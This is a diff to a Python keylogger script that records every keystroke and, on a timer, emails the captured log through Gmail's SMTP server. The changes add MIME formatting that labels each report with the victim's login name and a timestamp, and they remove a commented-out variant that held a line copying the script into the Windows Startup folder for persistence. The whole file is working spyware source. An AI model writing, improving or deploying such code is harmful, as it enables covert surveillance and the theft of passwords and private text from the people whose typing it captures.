@@ -2,14 +2,21 @@ import keyboard
 import smtplib
 import sys
 import os
+import datetime
 
 from threading import Semaphore, Timer
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
-with open(os.path.join(sys.path[0], 'password.txt'), 'r') as f:
+with open('E:/src/password.txt', 'r') as f:
     file = f.readlines()
     email = file[0]
     password = file[1]
-    interval = file[2]
+    interval = int(file[2])
+
+username = os.getlogin()
 
 class Keylogger:
     def __init__(self, interval):
@@ -31,10 +38,6 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
 
-        f = open("log.txt", "w")
-        f.write(self.log)
-        f.close()
-
     def sendmail(self, email, password, message):
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
@@ -44,7 +47,16 @@ class Keylogger:
 
     def report(self):
         if self.log:
-            self.sendmail(email, password, self.log)
+            current_time = datetime.datetime.now()
+
+            msg = MIMEMultipart()
+            msg['From'] = f'{username}-Logs'
+            msg['To'] = email
+            msg['Subject'] = f'Logging-{username}: {current_time}'
+            msg.attach(MIMEText(self.log, 'plain'))
+            text = msg.as_string()
+
+            self.sendmail(email, password, text)
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
 
@@ -57,32 +69,3 @@ class Keylogger:
 if __name__ == "__main__":
     keylogger = Keylogger(interval=interval)
     keylogger.start()
-
-# import logging
-# import os
-# from shutil import copyfile
-
-# from pynput.keyboard import Listener
-
-# username = os.getlogin()
-# # Moved to hidden folder
-# logging_dir = os.getcwd()
-
-# #copyfile('logger.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
-
-# logging.basicConfig(filename=f'{logging_dir}/mylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-# def key_handler(key):
-#     key = str(key).replace("'", "")
-
-#     if key == 'Key.space':
-#         key = ' '
-#     if key == 'Key.shift_r':
-#         key = ''
-#     if key == "Key.enter":
-#         key = '\n'
-
-#     logging.info(key)
-
-# with Listener(on_press=key_handler) as listener:
-#     listener.join()
